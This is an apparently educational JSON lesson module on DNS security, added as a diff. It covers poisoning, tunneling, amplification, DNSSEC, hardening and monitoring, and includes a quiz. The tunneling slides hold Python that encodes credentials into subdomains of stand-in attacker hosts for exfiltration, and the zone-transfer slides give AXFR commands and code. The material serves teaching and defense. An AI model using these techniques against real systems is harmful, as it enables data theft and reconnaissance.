@@ -1,0 +1,119 @@
+{
+    "id": "learn_dns_security",
+    "topicId": "dns_security",
+    "topicTitle": "DNS Security",
+    "description": "Understand the critical vulnerabilities in the Domain Name System (DNS) and how to secure it using DNSSEC and monitoring.",
+    "baseKP": 100,
+    "slides": [
+        {
+            "id": "dns_intro_1",
+            "type": "content",
+            "title": "DNS Overview",
+            "content": "# The Internet's Phonebook 📒\n\n**DNS (Domain Name System)** translates human-readable domain names (like google.com) into IP addresses (like 142.250.190.46).\n\n## Why is it vulnerable?\nOriginal DNS was built without security.\n-   **No Authentication**: Anyone can claim to be a DNS server.\n-   **No Integrity**: Responses can be modified in transit.\n-   **UDP Based**: Easy to spoof source addresses for amplification."
+        },
+        {
+            "id": "dns_poisoning_1",
+            "type": "content",
+            "title": "DNS Cache Poisoning",
+            "content": "# DNS Cache Poisoning ☠️\n\nAlso known as **DNS Spoofing**.\n\n## The Attack\n1.  Attacker queries a recursive DNS server for a target domain (e.g., bank.com).\n2.  While the server queries the authoritative nameserver, the attacker floods the server with forged responses.\n3.  If a forged response matches the Transaction ID and Port, the server accepts it.\n4.  **Result**: The server caches the fake IP. Users asking for bank.com go to the attacker's IP."
+        },
+        {
+            "id": "dns_poisoning_visual",
+            "type": "content",
+            "title": "Poisoning Diagram",
+            "content": "# Visualizing the Poison 🧪\n\n```mermaid\nsequenceDiagram\n    participant Attacker\n    participant RecursiveDNS\n    participant AuthDNS\n    Attacker->>RecursiveDNS: Query: bank.com?\n    RecursiveDNS->>AuthDNS: Query: bank.com?\n    Attacker->>RecursiveDNS: Fake Resp: bank.com = 6.6.6.6 (Guessed ID)\n    AuthDNS-->>RecursiveDNS: Real Resp: bank.com = 1.2.3.4 (Too Late)\n    Note left of RecursiveDNS: Cache: bank.com -> 6.6.6.6\n```\n\n> ⚠️ **Impact:** Phishing, Man-in-the-Middle, Malware Distribution."
+        },
+        {
+            "id": "kaminsky_bug",
+            "type": "content",
+            "title": "Kaminsky Vulnerability",
+            "content": "# The Kaminsky Flaw 🐛\n\nDiscovered by Dan Kaminsky in 2008.\n\n## The Innovation\n-   Traditional poisoning had to wait for cache expiry (TTL).\n-   Kaminsky's method queried random subdomains (e.g., `123.bank.com`, `456.bank.com`).\n-   This forced the server to query authoritative servers constantly, giving the attacker infinite attempts to guess the Transaction ID.\n-   The fake response would include an \"Authority Section\" poisoning the entire zone for `bank.com`."
+        },
+        {
+            "id": "dnssec_1",
+            "type": "content",
+            "title": "Enter DNSSEC",
+            "content": "# DNSSEC: The Solution 🛡️\n\n**Domain Name System Security Extensions (DNSSEC)** adds cryptographic signatures to DNS records.\n\n## How it Works\n-   **Authentication**: Verifies the data came from the true origin.\n-   **Integrity**: Ensures data wasn't changed in transit.\n-   **Chain of Trust**: Uses a chain of keys (KSK, ZSK) from the Root Zone down to the domain.\n\n> 📝 **Note:** DNSSEC does *not* encrypt traffic (privacy); it signs it (authenticity)."
+        },
+        {
+            "id": "dnssec_records",
+            "type": "content",
+            "title": "DNSSEC Records",
+            "content": "# New DNS Records 📝\n\nDNSSEC introduces several new record types:\n\n1.  **RRSIG**: Resource Record Signature (The digital signature).\n2.  **DNSKEY**: Public key used to verify the signature.\n3.  **DS**: Delegation Signer (fingerprint of the child's key at the parent zone).\n4.  **NSEC/NSEC3**: Authenticated denial of existence (proves a name *doesn't* exist)."
+        },
+        {
+            "id": "dns_tunneling_1",
+            "type": "content",
+            "title": "DNS Tunneling",
+            "content": "# DNS Tunneling 🚇\n\nUsing the DNS protocol to bypass firewalls and exfiltrate data.\n\n## Mechanism\n-   **Data Encoding**: Attacker encodes data (e.g., base64) into the *subdomain* of a query.\n    -   Query: `SECRET-DATA.attacker.com`\n-   **Exfiltration**: The query reaches the attacker's authoritative server, which logs the `SECRET-DATA`.\n-   **C2 Channel**: The attacker replies with a TXT record containing commands.\n    -   Response: `TXT: \"format_c\"`\n\n> 🔍 **Detection**: Look for long, high-entropy subdomains and high volume of queries to a single obscure domain."
+        },
+        {
+            "id": "dns_tunnel_code",
+            "type": "content",
+            "title": "Tunneling Concept",
+            "content": "# Tunneling Simulation 🐍\n\nHow data is chunked and encoded into subdomains.\n\n```python\nimport  base64\n\ndata = \"User:admin|Pass:12345\"\nencoded = base64.b32encode(data.encode()).decode()\nquery = f\"{encoded}.attacker.com\"\nprint(f\"Sending query: {query}\")\n```\n\n<!-- FULL_CODE_START\nimport base64\n\nprint(\"=== DNS Tunneling Data Encoder ===\")\n\ndef encode_for_dns(secret_data):\n    # Base32 is often used because it's case-insensitive safe for DNS\n    encoded_bytes = base64.b32encode(secret_data.encode())\n    encoded_str = encoded_bytes.decode()\n    \n    # Split if too long (labels max 63 chars)\n    chunks = [encoded_str[i:i+63] for i in range(0, len(encoded_str), 63)]\n    return \".\".join(chunks)\n\nsecret = \"CONFIDENTIAL_DOCUMENT_ID_9921\"\nprint(f\"Original Data: {secret}\")\n\ndns_payload = encode_for_dns(secret)\nattacker_domain = \"bad-actor.net\"\nfull_query = f\"{dns_payload}.{attacker_domain}\"\n\nprint(f\"\\n[>] Generated DNS Query:\")\nprint(full_query)\nprint(f\"\\n[!] The attacker's nameserver for '{attacker_domain}' will receive this query containing your secret.\")\nFULL_CODE_END -->"
+        },
+        {
+            "id": "dns_amp_1",
+            "type": "content",
+            "title": "DNS Amplification",
+            "content": "# DNS Amplification 🔊\n\nA classic Distributed Denial of Service (DDoS) attack.\n\n## The Physics of Amplification\n-   **Small Request**: Attacker sends a small query (60 bytes) with a **spoofed IP** (victim's IP).\n-   **Large Response**: Asks for `ANY` records or large TXT records (3000+ bytes).\n-   **Amplification Factor**: 50x to 100x.\n\n## The Impact\n The open DNS resolver sends the massive response to the unsuspecting victim, flooding their bandwidth."
+        },
+        {
+            "id": "dns_amp_quiz",
+            "type": "quiz",
+            "title": "Amplification Quiz",
+            "content": "Check your understanding of DDoS.",
+            "quizQuestion": "Why is UDP preferred over TCP for DNS Amplification attacks?",
+            "quizOptions": [
+                "UDP is encrypted",
+                "UDP is slower but reliable",
+                "UDP packets are stateless and easy to spoof source IP",
+                "UDP requires a handshake"
+            ],
+            "correctOptionIndex": 2
+        },
+        {
+            "id": "dns_monitoring_1",
+            "type": "content",
+            "title": "DNS Monitoring",
+            "content": "# DNS Monitoring 👁️\n\nSince DNS is critical and noisy, detecting attacks requires careful monitoring.\n\n## What to Watch\n-   **New Domains**: Spikes in queries to newly registered domains (DGA - Domain Generation Algorithms).\n-   **Query Volume**: Sudden increase in NXDOMAIN (Non-Existent Domain) responses (scanning/poisoning attempts).\n-   **Record Types**: Excessive TXT or ANY queries (Tunneling/Amplification).\n-   **Entropy**: High randomness in subdomain names."
+        },
+        {
+            "id": "doh_dot",
+            "type": "content",
+            "title": "DoH and DoT",
+            "content": "# Encrypted DNS 🔒\n\nTraditional DNS is plaintext. ISPs and attackers can see your browsing/queries.\n\n## DoH (DNS over HTTPS)\n-   Encapsulates DNS queries in HTTPS traffic (Port 443).\n-   Blends in with web traffic, hard to block/monitor.\n\n## DoT (DNS over TLS)\n-   Encapsulates DNS in TLS (Port 853).\n-   Dedicated port, easier for network admins to manage/block.\n\n> 🛡️ **Privacy**: Both prevent eavesdropping and manipulation (Man-in-the-Middle)."
+        },
+        {
+            "id": "bind_hardening",
+            "type": "content",
+            "title": "Hardening BIND",
+            "content": "# Hardening BIND 🧱\n\nBIND is the most popular DNS software. Key configuration steps:\n\n1.  **Hide Version**: `version \"none\";` to prevent reconnaissance.\n2.  **Restrict Recursion**: `allow-recursion { trusted_nets; };` to prevent acting as an open amplifier.\n3.  **Rate Limiting**: `rate-limit { ... };` to slow down brute force/floods.\n4.  **Run as Non-Root**: Run the `named` user, chrooted if possible."
+        },
+        {
+            "id": "zone_transfer",
+            "type": "content",
+            "title": "Zone Transfer (AXFR)",
+            "content": "# Zone Transfers 📂\n\nZone transfers (AXFR) allow secondary servers to replicate the entire database from the primary.\n\n## The Risk\n-   If misconfigured to `allow-transfer { any; };`, an attacker can download the **entire** map of your internal network.\n-   Reveals subdomains, internal IPs, server types.\n\n## Testing with Dig\n`dig axfr @ns1.target.com target.com`"
+        },
+        {
+            "id": "zone_transfer_code",
+            "type": "content",
+            "title": "Python Zone Transfer",
+            "content": "# Automating Zone Transfer 🐍\n\nUsing Python `dnspython` to attempt a transfer.\n\n```python\nimport dns.zone, dns.query\n\ntry:\n    z = dns.zone.from_xfr(dns.query.xfr('ns.bank.com', 'bank.com'))\n    for n in z.nodes.keys():\n        print(n.to_text(z.origin))\nexcept: \n    print(\"Transfer Failed\")\n```\n\n<!-- FULL_CODE_START\n# Requires dnspython: pip install dnspython\nimport sys\n\ntry:\n    import dns.query\n    import dns.zone\n    import dns.resolver\n\n    print(\"=== Zone Transfer Simulation ===\")\n    target_domain = \"zonetransfer.me\" # A public test domain allowing AXFR\n    # Note: We need to find the nameservers first\n    \n    print(f\"[*] Finding nameservers for {target_domain}...\")\n    try:\n        ns_records = dns.resolver.resolve(target_domain, 'NS')\n        nameservers = [ns.target.to_text() for ns in ns_records]\n        print(f\"[*] Found NS: {nameservers}\")\n        \n        ns_ip = nameservers[0]\n        print(f\"[*] Attempting AXFR from {ns_ip}...\")\n        \n        # Actual transfer attempt\n        # Note: In Piston/Sandbox environments, outbound DNS (TCP 53) might be blocked or fail.\n        # This code structure is correct for a local environment.\n        \n        # xfr = dns.query.xfr(ns_ip, target_domain)\n        # zone = dns.zone.from_xfr(xfr)\n        \n        # for name, node in zone.nodes.items():\n        #     print(zone[name].to_text(name))\n            \n        print(\"[!] Simulation: Code is valid, but network restrictions may prevent actual transfer.\")\n        print(\"[!] If successful, you would see a list of all subdomains here.\")\n\n    except Exception as e:\n        print(f\"[-] Error: {e}\")\n\nexcept ImportError:\n    print(\"[-] dnspython module not found. Use 'pip install dnspython'\")\nFULL_CODE_END -->"
+        },
+        {
+            "id": "dns_sinkhole",
+            "type": "content",
+            "title": "DNS Sinkholing",
+            "content": "# DNS Sinkhole 🕳️\n\nA defense technique.\n\n## How it Works\n1.  Security team identifies a malicious domain (e.g., botnet C2).\n2.  They configure the internal DNS server to return a specific, safe IP (the sinkhole) for that domain.\n3.  Infected clients connecting to the C2 are redirected to the sinkhole.\n4.  **benefit**: Stops the attack AND logs the IP of the infected machine for reuse."
+        },
+        {
+            "id": "dns_summary",
+            "type": "content",
+            "title": "Module Summary",
+            "content": "# Wrap Up 🎁\n\n-   **Poisoning**: Injects fake records; fix with randomness and DNSSEC.\n-   **Amplification**: Uses open resolvers to flood victims; fix by disabling recursion for outsiders.\n-   **Tunneling**: Exfiltrates data via queries; fix by monitoring query length and frequency.\n-   **Privacy**: DoH and DoT prevent snooping.\n\nDNS is the backbone of the internet. Securing it protects the entire infrastructure!"
+        }
+    ]
+}
